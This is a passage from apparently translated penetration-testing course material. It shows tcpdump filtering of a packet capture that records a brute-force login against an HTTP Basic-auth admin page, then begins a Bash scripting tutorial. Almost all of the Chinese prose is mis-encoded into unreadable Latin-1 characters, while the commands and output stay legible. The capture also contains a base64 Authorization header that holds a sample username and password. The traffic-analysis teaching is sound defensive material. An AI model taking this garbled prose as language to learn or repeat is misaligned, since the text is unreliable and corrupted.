IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n08:51:20.801048 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.801051 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n...\n```\n\n### è¿‡æ»¤æµé‡\n\nä¸€å¼€å§‹ï¼Œè¾“å‡ºç»“æœæœ‰ç‚¹è®©äººä¸çŸ¥æ‰€æªï¼Œæ‰€ä»¥è®©æˆ‘ä»¬è¯•ç€é€šè¿‡ä½¿ç”¨ awk å’Œ sort æ¥æ›´å¥½åœ°äº†è§£æ‰€æ¶‰åŠçš„ IP åœ°å€å’Œç«¯å£ã€‚\n\né¦–å…ˆï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ `-n` é€‰é¡¹æ¥è·³è¿‡ DNS åç§°æŸ¥è¯¢ï¼Œä½¿ç”¨ `-r` æ¥è¯»å–æˆ‘ä»¬çš„æ•°æ®åŒ…æ•è·æ–‡ä»¶ã€‚ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ç®¡é“ç¬¦å°†è¾“å‡ºè¾“å…¥åˆ° awkï¼Œæ‰“å°å‡ºç›®æ ‡ IP åœ°å€å’Œç«¯å£ï¼ˆç¬¬ä¸‰ä¸ªç©ºæ ¼åˆ†å‰²çš„å­—ç¬¦ï¼‰ï¼Œå¹¶å†æ¬¡ç”¨ç®¡é“ç¬¦è¾“å…¥ sort å’Œ uniq -cï¼Œåˆ†åˆ«å¯¹è¯¥å­—æ®µåœ¨æ•è·ä¸­å‡ºç°çš„æ¬¡æ•°è¿›è¡Œæ’åºå’Œè®¡æ•°ã€‚æœ€åï¼Œæˆ‘ä»¬ç”¨head åªæ˜¾ç¤ºè¾“å‡ºçš„å‰ 10 è¡Œã€‚\n\n```bash\nkali@kali:~$ sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F\" \" '{print\n$5}' | sort | uniq -c | head\n 20164 172.16.40.10.81:\n 14 208.68.234.99.32768:\n 14 208.68.234.99.32769:\n 6 208.68.234.99.32770:\n 14 208.68.234.99.32771:\n 6 208.68.234.99.32772:\n 6 208.68.234.99.32773:\n 15 208.68.234.99.32774:\n 12 208.68.234.99.32775:\n 6 208.68.234.99.32776:\n...\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ172.16.40.10 æ˜¯æœ€å¸¸è§çš„ç›®æ ‡åœ°å€ï¼Œå…¶æ¬¡æ˜¯ 208.68.234.99ã€‚é‰´äº 172.16.40.10 æ˜¯é€šè¿‡ä½ç›®çš„ç«¯å£ï¼ˆ81ï¼‰è”ç³»çš„ï¼Œè€Œ 208.68.234.99 æ˜¯é€šè¿‡é«˜ç›®çš„ç«¯å£è”ç³»çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ­£ç¡®åœ°å‡è®¾å‰è€…æ˜¯æœåŠ¡å™¨ï¼Œåè€…æ˜¯å®¢æˆ·ç«¯ã€‚\n\næˆ‘ä»¬ä¹Ÿå¯ä»¥å®‰å…¨åœ°å‡è®¾å®¢æˆ·åœ°å€å¯¹æœåŠ¡å™¨å‘å‡ºäº†è®¸å¤šè¯·æ±‚ï¼Œä½†ä¸ºäº†ä¸åšè¿‡å¤šçš„å‡è®¾ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿‡æ»¤å™¨æ¥æ›´ä»”ç»†åœ°æ£€æŸ¥æµé‡ã€‚\n\nä¸ºäº†ä»å‘½ä»¤è¡Œä¸­è¿›è¡Œè¿‡æ»¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨æºä¸»æœºï¼ˆsrc hostï¼‰å’Œç›®çš„ä¸»æœºï¼ˆdst hostï¼‰è¿‡æ»¤å™¨ï¼Œåˆ†åˆ«åªè¾“å‡ºæºå’Œç›®çš„æµé‡ã€‚æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ç«¯å£å·ï¼ˆ-n port 81ï¼‰è¿›è¡Œè¿‡æ»¤ï¼Œä»¥æ˜¾ç¤ºé’ˆå¯¹ç«¯å£ 81 çš„å…ƒæµé‡å’Œç›®çš„æµé‡ã€‚ç°åœ¨è®©æˆ‘ä»¬è¯•è¯•è¿™äº›è¿‡æ»¤å™¨ã€‚\n\n```bash\nsudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap\n...\n08:51:20.801051 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n08:51:20.802053 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [.], ack 89, win 905,\noptions [nop,nop,TS val 71430591 ecr 25538253], length 0\n...\nsudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap\n...\n08:51:20.801048 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.802026 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [.], ack 4166855390,\nwin 115, options [nop,nop,TS val 25538253 ecr 71430591], length 0\n...\nsudo tcpdump -n port 81 -r password_cracking_filtered.pcap\n...\n08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.800953 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n...\n```\n\næˆ‘ä»¬å¯ä»¥ç»§ç»­ç”¨å„ç§å‘½ä»¤è¡Œå·¥å…·å¦‚ awk å’Œ grep æ¥å¤„ç†è¿™äº›è¿‡æ»¤åçš„è¾“å‡ºï¼Œä½†è®©æˆ‘ä»¬ç»§ç»­å‰è¿›ï¼Œå®é™…æ£€æŸ¥ä¸€äº›æ•°æ®åŒ…ï¼Œçœ‹çœ‹æˆ‘ä»¬èƒ½å‘å…ˆç”Ÿä»¬æ ·çš„ç»†èŠ‚ã€‚\n\nä¸ºäº†è½¬å‚¨æ•è·çš„æµé‡ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ `-X` é€‰é¡¹æ¥æ‰“å° HEX å’Œ ASCII æ ¼å¼çš„æ•°æ®åŒ…ã€‚\n\n```bash\nkali@kali:~$ sudo tcpdump -nX -r password_cracking_filtered.pcap\n...\n08:51:25.043062 IP 208.68.234.99.33313 > 172.16.40.10.81: Flags [P.], seq 1:140, ack 1\n 0x0000: 4500 00bf 158c 4000 3906 9cea d044 ea63 E ....@.9....D.c\n 0x0010: ac10 280a 8221 0051 a726 a77c 6fd8 ee8a ..(..!.Q.&.|o...\n 0x0020: 8018 0073 1c76 0000 0101 080a 0185 b2f2 ...s.v ........\n 0x0030: 0441 f5e3 4745 5420 2f2f 6164 6d69 6e20 .A..GET.//admin.\n 0x0040: 4854 5450 2f31 2e31 0d0a 486f 7374 3a20 HTTP/1.1..Host:.\n 0x0050: 6164 6d69 6e2e 6d65 6761 636f 7270 6f6e admin.megacorpon\n 0x0060: 652e 636f 6d3a 3831 0d0a 5573 6572 2d41 e.com:81..User-A\n 0x0070: 6765 6e74 3a20 5465 6820 466f 7265 7374 gent:.Teh.Forest\n 0x0080: 204c 6f62 7374 6572 0d0a 4175 7468 6f72 .Lobster..Author\n 0x0090: 697a 6174 696f 6e3a 2042 6173 6963 2059 ization:.Basic.Y\n 0x00a0: 5752 7461 5734 3662 6d46 7562 3352 6c59 WRtaW46bmFub3RlY\n 0x00b0: 3268 7562 3278 765a 336b 780d 0a0d 0a 2hub2xvZ3kx ...\n...\n```\n\næˆ‘ä»¬ç«‹å³æ³¨æ„åˆ°ï¼Œ81 å·ç«¯å£çš„ 172.16.40.10 çš„æµé‡çœ‹èµ·æ¥åƒ HTTP æ•°æ®ã€‚äº‹å®ä¸Šï¼Œè¿™äº› HTTP è¯·æ±‚ä¼¼ä¹åŒ…å«åŸºæœ¬ HTTP è®¤è¯æ•°æ®ï¼Œç”¨æˆ·ä»£ç†ä¸º â€œTeh Forest Lobsterâ€ã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸æ˜æ˜¾çš„è¿¹è±¡ï¼Œè¡¨æ˜æœ‰ä¸€äº›å¥‡æ€ªçš„äº‹æƒ…æ­£åœ¨å‘ç”Ÿã€‚\n\nä¸ºäº†æ­å¼€å…¶ä½™çš„ç¥ç§˜é¢çº±ï¼Œæˆ‘ä»¬éœ€è¦ä¾é å…ˆè¿›çš„å¤´ä¿¡æ¯è¿‡æ»¤ã€‚\n\n### é«˜çº§æ ‡é¢˜è¿‡æ»¤\n\nåœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œä¸ºäº†æ›´å¥½åœ°æ£€æŸ¥è½¬å‚¨ä¸­çš„è¯·æ±‚å’Œå“åº”ï¼Œæˆ‘ä»¬æƒ³è¿‡æ»¤æ‰å¹¶åªæ˜¾ç¤ºæ•°æ®åŒ…ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°†å¯»æ‰¾é‚£äº›å¼€å¯äº† PSH å’Œ ACK æ ‡å¿—çš„æ•°æ®åŒ…ã€‚åœ¨æœ€åˆçš„ 3 æ¬¡æ¡æ‰‹åï¼Œæ‰€æœ‰å‘é€å’Œæ¥æ”¶çš„æ•°æ®åŒ…éƒ½å°†è®¾ç½® ACK æ ‡å¿—ã€‚PSH æ ‡å¿—ç”¨äºå¼ºåˆ¶æ‰§è¡Œæ•°æ®åŒ…çš„å³æ—¶äº¤ä»˜ï¼Œé€šå¸¸ç”¨äºäº¤äº’å¼åº”ç”¨å±‚åè®®ä»¥é¿å…ç¼“å†²ã€‚\n\nä¸‹å›¾æè¿°äº† TCP å¤´ï¼Œè¡¨æ˜ TCP æ ‡å¿—ä»ç¬¬ 14 ä¸ªå­—ç¬¦å¼€å§‹å®šä¹‰ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2b624ee0-48b7-4956-878e-059a97ea0cca/Untitled.png)\n\nè§‚å¯Ÿä¸Šå›¾ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° ACK å’Œ PSH åˆ†åˆ«ç”±ç¬¬ 14 å­—èŠ‚çš„ç¬¬å››å’Œç¬¬äº”ä½è¡¨ç¤ºã€‚\n\n```bash\nCEUAPRSF\nWCRCSSYI\nREGKHTNN\n00011000 = 24 in decimal\n```\n\nåªæ‰“å¼€è¿™äº›ä½ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°00011000ï¼Œæˆ–åè¿›åˆ¶çš„ 24ã€‚\n\n```bash\nkali@kali:~$ echo \"$((2#00011000))\"\n24\n```\n\næˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªæ•°å­—ä¸ â€˜tcp[13] = 24â€™ ä¸€èµ·ä¼ é€’ç»™ tcpdump ä½œä¸ºæ˜¾ç¤ºè¿‡æ»¤å™¨ï¼Œä»¥è¡¨æ˜æˆ‘ä»¬åªæƒ³çœ‹åˆ°è®¾ç½®äº† ACK å’Œ PSH ä½çš„æ•°æ®åŒ…ï¼ˆâ€œæ•°æ®åŒ…â€ï¼‰ï¼Œç”± TCP å¤´çš„ç¬¬ 14 å­—èŠ‚çš„ç¬¬å››å’Œç¬¬äº”ä½ï¼ˆ24ï¼‰ä»£è¡¨ã€‚è¯·è®°ä½ï¼Œç”¨äºè®¡ç®—å­—èŠ‚æ•°çš„ tcpdump æ•°ç»„ç´¢å¼•ä» 0 å¼€å§‹ï¼Œæ‰€ä»¥è¯­æ³•åº”è¯¥æ˜¯ï¼ˆtcp[13]ï¼‰ã€‚\n\nè¿™ä¸¤ä¸ªæ ‡å¿—çš„ç»„åˆå°†æœ‰æœ›äºåªæƒ³æˆ‘ä»¬æ˜¾ç¤º HTTP è¯·æ±‚å’Œå“åº”æ•°æ®ã€‚ä¸‹é¢æ˜¯æˆ‘ä»¬ç”¨æ¥æ˜¾ç¤ºè®¾ç½®äº† ACK æˆ– PSH æ ‡å¿—çš„æ•°æ®åŒ…çš„å‘½ä»¤ã€‚\n\n```bash\nkali@kali:~$ sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap\n06:51:20.802032 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [P.], seq 1855084075:1\nE ....@.9....D.c..(\n.].Qn.V+.]*....s1 .....\n....A..GET //admin HTTP/1.1\nHost: admin.megacorpone.com:81\nUser-Agent: Teh Forest Lobster\n\n...\nE ....@.@.....(\n.D.c.Q.^...E..?I ..........\n.A .....HTTP/1.1 401 Authorization Required\nDate: Mon, 22 Apr 2013 12:51:20 GMT\nServer: Apache/2.2.20 (Ubuntu)\nWWW-Authenticate: Basic realm=\"Password Protected Area\"\nVary: Accept-Encoding\nContent-Length: 488\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>401 Authorization Required</title>\n</head><body>\n<h1>Authorization Required</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n<hr>\n<address>Apache/2.2.20 (Ubuntu) Server at admin.megacorpone.com Port 81</address>\n</body></html>\n\n...\n08:51:25.044432 IP 172.16.40.10.81 > 208.68.234.99.33313:\nE..s.m@.@..U..(\n.D.c.Q.!o....& .....^u.....\n.A .....HTTP/1.1 301 Moved Permanently\nDate: Mon, 22 Apr 2013 12:51:25 GMT\nServer: Apache/2.2.20 (Ubuntu)\nLocation: <http://admin.megacorpone.com:81/admin/>\nVary: Accept-Encoding\nContent-Length: 333\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>301 Moved Permanently</title>\n</head><body>\n<h1>Moved Permanently</h1>\n<p>The document has moved <a\nhref=\"<http://admin.megacorpone.com:81/admin/>\">here</a>.</p>\n<hr>\n<address>Apache/2.2.20 (Ubuntu) Server at admin.megacorpone.com Port 81</address>\n</body></html>\n```\n\nä»è¿™é‡Œï¼Œæˆ‘ä»¬çš„æ•…äº‹å˜å¾—æ›´åŠ æ¸…æ™°ã€‚æˆ‘ä»¬çœ‹åˆ°æœ‰å¤§é‡çš„éªŒè¯ /admin ç›®å½•çš„å¤±è´¥å°è¯•ï¼Œç»“æœæ˜¯ HTTP 401 å›å¤ï¼Œè€Œæœ€åä¸€æ¬¡ç™»å½•å°è¯•ä¼¼ä¹æˆåŠŸäº†ï¼Œå› ä¸ºæœåŠ¡å™¨å›å¤äº† HTTP 301 å›å¤ã€‚çœ‹æ¥æœ‰äººè·å¾—äº†å¯¹ Megacorpone çš„ä¸€å°æœåŠ¡å™¨çš„è®¿é—®æƒï¼\n\n# Bash è„šæœ¬\n\nGUN Bourne-Again Shellï¼ˆBASHï¼‰æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥ä½œç¯å¢ƒå’Œè„šæœ¬å¼•æ“ã€‚ä¸€ä¸ªåˆæ ¼çš„å®‰å…¨ä¸“ä¸šåŒ–äººå‘˜ä¼šç†Ÿç»ƒåœ°åˆ©ç”¨ Bash è„šæœ¬æ¥ç®€åŒ–å’Œè‡ªåŠ¨åŒ–è®¸å¤š Linux ä»»åŠ¡å’Œç¨‹åºã€‚åœ¨æœ¬æ¨¡å—ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç» Bash è„šæœ¬ï¼Œå¹¶æ¢è®¨å‡ ä¸ªå®é™…çš„åœºæ™¯ã€‚\n\n## Bash è„šæœ¬çš„ä»‹ç»\n\nBash è„šæœ¬æ˜¯ä¸€ä¸ªåŒ…å«ä¸€ç³»åˆ—å‘½ä»¤çš„çº¯æ–‡æœ¬æ–‡ä»¶ï¼Œæ‰§è¡Œèµ·æ¥å°±åƒåœ¨ç»ˆç«¯æç¤ºç¬¦ä¸‹è¾“å…¥çš„ä¸€æ ·ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒBash è„šæœ¬æœ‰ä¸€ä¸ªå¯é€‰çš„æ‰©å±•å .shï¼ˆä¸ºäº†ä¾¿äºè¯†åˆ«ï¼‰ï¼Œä»¥ #!/bin/bash å¼€å¤´ï¼Œåœ¨æ‰§è¡Œä¹‹å‰å¿…é¡»è®¾ç½®å¯æ‰§è¡Œæƒé™ã€‚è®©æˆ‘ä»¬ä»ä¸€ä¸ªç®€å•çš„ â€œHello Worldâ€ Bash è„šæœ¬å¼€å§‹ã€‚\n\n```bash\nkali@kali:~$ cat ./hello-world.sh\n#!/bin/bash\n# Hello World Bash Script\necho \"Hello World!\"\n```\n\nè¿™ä¸ªè„šæœ¬æœ‰å‡ ä¸ªéƒ¨åˆ†å€¼å¾—è§£é‡Šã€‚\n\n- ç¬¬ 1 è¡Œï¼š#1 é€šå¸¸è¢«ç§°ä¸º â€œshebangâ€ï¼Œå®ƒè¢« Bash è§£é‡Šå™¨æ‰€å¿½ç•¥ã€‚ç¬¬äºŒéƒ¨åˆ†ï¼Œ/bin/bashï¼Œæ˜¯è§£é‡Šå™¨çš„ç»å¯¹è·¯å¾„ï¼Œç”¨æ¥è¿è¡Œè¯¥è„šæœ¬ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¿™æ˜¯ä¸€ä¸ª â€œBash è„šæœ¬â€ï¼Œè€Œä¸æ˜¯å…¶ä»–ç±»å‹çš„ shell è„šæœ¬ï¼Œæ¯”å¦‚è¯´ â€œC Shellâ€ è„šæœ¬ã€‚\n- ç¬¬ 2 è¡Œï¼š# æ˜¯ç”¨æ¥æ·»åŠ æ³¨é‡Šçš„ï¼Œæ‰€ä»¥å®ƒåé¢çš„æ‰€æœ‰æ–‡å­—éƒ½è¢«å¿½ç•¥äº†ã€‚\n- ç¬¬ 3 è¡Œï¼šecho â€œHello Worldï¼â€ ä½¿ç”¨ echo Linux å‘½ä»¤å·¥å…·å‘ç»ˆç«¯æ‰“å°ä¸€ä¸ªç»™å®šçš„å­—ç¬¦ä¸²ï¼Œåœ¨æœ¬ä¾‹ä¸­æ˜¯ â€œHello Wolrdï¼â€ã€‚\n\næ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬æŠŠè¿™ä¸ªè„šæœ¬å˜æˆå¯æ‰§è¡Œçš„å¹¶è¿è¡Œå®ƒã€‚\n\n```bash\nkali@kali:~$ chmod +x hello-world.sh\n\nkali@kali:~$ ./hello-world.sh\nHello World!\n```\n\nchmod å‘½ä»¤å’Œ +x é€‰é¡¹ç”¨æ¥ä½¿è„šæœ¬å¯æ‰§è¡Œï¼Œè€Œ ./hello-world.sh åˆ™ç”¨æ¥å®é™…è¿è¡Œå®ƒã€‚./ è¿™ä¸ªç¬¦å·å¯èƒ½çœ‹èµ·æ¥å¾ˆæ··ä¹±ï¼Œä½†è¿™åªæ˜¯ä¸€ä¸ªè·¯å¾„ç¬¦å·ï¼Œè¡¨ç¤ºè¿™ä¸ªè„šæœ¬åœ¨å½“å‰ç›®å½•ä¸‹ã€‚æ¯å½“æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå‘½ä»¤æ—¶ï¼ŒBash éƒ½ä¼šè¯•å›¾åœ¨ä¸€ç³»åˆ—å­˜å‚¨åœ¨ä¸€ä¸ªå«åš PATH çš„å˜é‡ä¸­çš„ç›®å½•ä¸­æ‰¾åˆ°å®ƒã€‚ç”±äºæˆ‘ä»¬çš„ä¸»ç›®å½•å¹¶ä¸åŒ…æ‹¬åœ¨è¿™ä¸ªå˜é‡ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»ä½¿ç”¨ç›¸å¯¹è·¯å¾„æ¥æ‰¾åˆ°æˆ‘ä»¬çš„ Bash è„šæœ¬ï¼Œä»¥ä½¿ Bash èƒ½å¤Ÿâ€œæ‰¾åˆ°â€å®ƒå¹¶è¿è¡Œå®ƒã€‚\n\nç°åœ¨æˆ‘ä»¬å·²ç»åˆ›å»ºäº†ç¬¬ä¸€ä¸ª Bash è„šæœ¬ï¼Œè®©æˆ‘ä»¬æ›´è¯¦ç»†åœ°æ¢è®¨ä¸€ä¸‹ Bashã€‚\n\n## å˜é‡\n\nå˜é‡æ˜¯ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®çš„å‘½ååœºæ‰€ã€‚æˆ‘ä»¬å¯ä»¥è®¾ç½®ï¼ˆæˆ–â€œå£°æ˜â€ï¼‰ä¸€ä¸ªå˜é‡ï¼Œä¸ºå…¶èµ‹å€¼ï¼Œæˆ–è¯»å–ä¸€ä¸ªå˜é‡ï¼Œå°†å…¶â€œæ‰©å±•â€æˆ–â€œè§£æâ€ä¸ºå…¶å­˜å‚¨å€¼ã€‚\n\næˆ‘ä»¬å¯ä»¥ç”¨å¤šç§æ–¹å¼å£°æ˜å˜é‡å€¼ã€‚æœ€ç®€å•çš„æ–¹æ³•æ˜¯ç”¨ä¸€ä¸ªç®€å•çš„ name=vulue å£°æ˜ç›´æ¥è®¾ç½®å€¼ã€‚æ³¨æ„ï¼Œâ€œ=â€ å·å‰åéƒ½æ²¡æœ‰ç©ºæ ¼ã€‚\n\n```bash\nkali@kali:~$ first_name=Good\n```\n\né™¤éæˆ‘ä»¬èƒ½å¤Ÿå¼•ç”¨ä¸€ä¸ªå˜é‡ï¼Œå¦åˆ™å£°æ˜è¯¥å˜é‡æ˜¯æ¯«æ— æ„ä¹‰çš„ã€‚ä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬åœ¨å˜é‡å‰é¢åŠ ä¸Š â€œ$â€ å­—ç¬¦ã€‚æ¯å½“ Bash åœ¨å‘½ä»¤ä¸­é‡åˆ°è¿™ç§è¯­æ³•æ—¶ï¼Œå®ƒå°±ä¼šåœ¨æ‰§è¡Œå‰å°†å˜é‡åæ›¿æ¢ä¸ºå…¶å€¼ï¼ˆâ€œæ‰©å±•â€å˜é‡ï¼‰ã€‚\n\n```bash\nkali@kali:~$ first_name=Good\n\nkali@kali:~$ last_name=Hacker\n\nkali@kali:~$ echo $first_name $last_name\nGood Hacker\n```\n\nå˜é‡åå¯ä»¥æ˜¯å¤§å†™çš„ï¼Œå°å†™çš„ï¼Œæˆ–è€…ä¸¤è€…çš„æ··åˆã€‚ç„¶è€Œï¼ŒBash æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å£°æ˜å’Œæ‰©å±•å˜é‡æ—¶å¿…é¡»ä¿æŒä¸€è‡´ã€‚æ­¤å¤–ï¼Œä½¿ç”¨æè¿°æ€§çš„å˜é‡åæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„åšæ³•ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬çš„è„šæœ¬æ›´å®¹æ˜“é˜…è¯»å’Œç»´æŠ¤ã€‚\n\nè¯·æ³¨æ„ï¼ŒBash ä¼šä»¥ç‰¹å®šçš„æ–¹å¼è§£é‡ŠæŸäº›å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œè¿™ä¸ªå£°æ˜å±•ç¤ºäº†ä¸€ä¸ªä¸æ°å½“çš„å¤šå€¼å˜é‡å£°æ˜ï¼š\n\n```bash\nkali@kali:~$ greeting=Hello World\nbash: World: command not found\n```\n\nè¿™ä¸ä¸€å®šæ˜¯æˆ‘ä»¬æ‰€æœŸæœ›çš„ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å•å¼•å·ï¼ˆâ€™ï¼‰æˆ–åŒå¼•å·ï¼ˆâ€ï¼‰æ¥ä¿å«æˆ‘ä»¬çš„æ–‡æœ¬ã€‚ç„¶è€Œï¼ŒBash å¯¹å•å¼•å·å’ŒåŒå¼•å·çš„å¤„ç†æ–¹å¼ä¸åŒã€‚å½“é‡åˆ°å•å¼•å·æ—¶ï¼ŒBash ä¼šæŒ‰å­—é¢æ„æ€è§£é‡Šæ¯ä¸ªè¢«åŒ…å›´çš„å­—ç¬¦ã€‚å½“é‡åˆ°åŒå¼•å·æ—¶ï¼Œé™¤äº† â€œ$â€ã€â€œâ€™â€ å’Œ â€œ\\â€ ä¹‹å¤–ï¼Œæ‰€æœ‰çš„å­—ç¬¦éƒ½æ˜¯æŒ‰å­—é¢æ„æ€æ¥ç†è§£çš„ï¼Œè¿™æ„å‘³ç€åœ¨å¯¹æ‰€åŒ…å«çš„æ–‡æœ¬è¿›è¡Œåˆå§‹æ›¿æ¢æ—¶ï¼Œå˜é‡å°†è¢«å±•å¼€ã€‚\n\nä¸€ä¸ªç®€å•çš„å˜é‡å°†è¢«å±•å¼€ã€‚ä¸€ä¸ªç®€å•çš„ä¾‹å­å°†æœ‰åŠ©äºæ¾„æ¸…è¿™ä¸€ç‚¹ã€‚\n\n```bash\nkali@kali:~$ greeting='Hello World'\n\nkali@kali:~$ echo $greeting\nHello World\n\nkali@kali:~$ greeting2=\"New $greeting\"\n\nkali@kali:~$ echo $greeting2\nNew Hello World\n```\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå•å¼•å·å°é—­çš„ greeting å£°æ˜å®Œå…¨ä¿ç•™äº†æˆ‘ä»¬çš„æ–‡æœ¬å€¼ï¼Œå¹¶ä¸”æ²¡æœ‰æŠŠç©ºæ ¼æˆªçŸ³ä½å‘½ä»¤åˆ†éš”ç¬¦ã€‚ç„¶è€Œï¼Œåœ¨ greeting2 çš„åŒå¼•å·å£°æ˜ä¸­ï¼ŒBash å°† $greeting æ‰©å±•ä¸ºå…¶å€¼ï¼ˆâ€œHello Worldâ€ï¼‰ï¼Œå°Šé‡äº† â€œ$â€ å­—ç¬¦çš„ç‰¹æ®Šå«ä¹‰ã€‚\n\næˆ‘ä»¬è¿˜å¯ä»¥å°†å˜é‡çš„å€¼è®¾ç½®ä¸ºä¸€ä¸ªå‘½ä»¤æˆ–ç¨‹åºçš„ç»“æœã€‚è¿™å°±æ˜¯æ‰€è°“çš„å‘½ä»¤æ›¿æ¢ï¼Œå®ƒå…è®¸æˆ‘ä»¬æŠŠä¸€ä¸ªå‘½ä»¤æˆ–ç¨‹åºçš„è¾“å‡ºï¼ˆé€šå¸¸ä¼šè¢«æ‰“å°åˆ°å±å¹•ä¸Šï¼‰ä¿å­˜ä¸ºä¸€ä¸ªå˜é‡çš„å€¼ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œå°†å˜é‡åç§°æ”¾åœ¨æ‹¬å· â€œ()â€ ä¸­ï¼Œå‰é¢åŠ ä¸€ä¸ª â€œ$â€ å­—ç¬¦ã€‚\n\n```bash\nkali@kali:~$ user=$(whoami)\n\nkali@kali:~$ echo $user\nkali\n```\n\næˆ‘ä»¬æŠŠ whoami å‘½ä»¤çš„è¾“å‡ºåˆ†é…ç»™ user å˜é‡ã€‚ç„¶åæˆ‘ä»¬æ˜¾ç¤ºå…¶å€¼ã€‚ä½¿ç”¨åå¼•å·æˆ–ä¸¥é‡å­—ç¬¦ (`) è¿›è¡Œå‘½ä»¤æ›¿æ¢çš„å¦ä¸€ç§è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```bash\nkali@kali:~$ user2=`whoami`\n\nkali@kali:~$ echo $user2\nkali\n```\n\nåå¼•å·æ–¹æ³•è¾ƒæ—§å¹¶ä¸”é€šå¸¸ä¸é¼“åŠ±ä½¿ç”¨ï¼Œå› ä¸ºè¿™ä¸¤ç§å‘½ä»¤æ›¿æ¢æ–¹æ³•çš„è¡Œä¸ºæ–¹å¼å­˜åœ¨å·®å¼‚ã€‚åŒæ ·é‡è¦çš„æ˜¯è¦æ³¨æ„å‘½ä»¤æ›¿æ¢å‘ç”Ÿåœ¨å­ shell ä¸­ï¼Œå¯¹å­ shell ä¸­çš„å˜é‡çš„æ›´æ”¹ä¸ä¼šæ”¹å˜æ¥è‡ªä¸» shell çš„å˜é‡è¿‡ç¨‹ã€‚è¿™åœ¨ä»¥ä¸‹ä¾‹å­ä¸­è¿›è¡Œäº†æ¼”ç¤ºï¼š\n\n```bash\nkali@kali:~$ cat ./subshell.sh\n\n#!/bin/bash -x\nvar1=value1\necho $var1\n\nvar2=value2\necho $var2\n\n$(var1=newvar1)\necho $var1\n\n`var2=newvar2`\necho $var2\n\nkali@kali:~$ ./subshell.sh\n+ var1=value1\n+ echo value1\nvalue1\n+ var2=value2\n+ echo value2\nvalue2\n++ var1=newvar1\n+ echo value1\nvalue1\n++ var2=newvar2\n+ echo value2\nvalue2\nkali@kali:~$\n```\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œé¦–å…ˆæ³¨æ„æˆ‘ä»¬æ”¹å˜äº† shebangï¼ŒåŠ å…¥äº† `-x` é€‰é¡¹ã€‚è¿™æŒ‡ç¤º Bash 